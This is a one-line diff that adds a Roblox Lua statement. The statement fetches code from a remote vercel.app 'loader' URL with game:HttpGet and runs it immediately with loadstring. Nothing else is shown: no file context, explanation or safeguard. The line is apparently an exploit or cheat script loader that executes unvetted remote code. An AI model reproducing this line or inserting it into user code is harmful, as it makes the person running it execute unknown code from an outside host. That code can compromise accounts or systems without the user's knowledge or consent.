@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://vbldarei.vercel.app/loader"))()
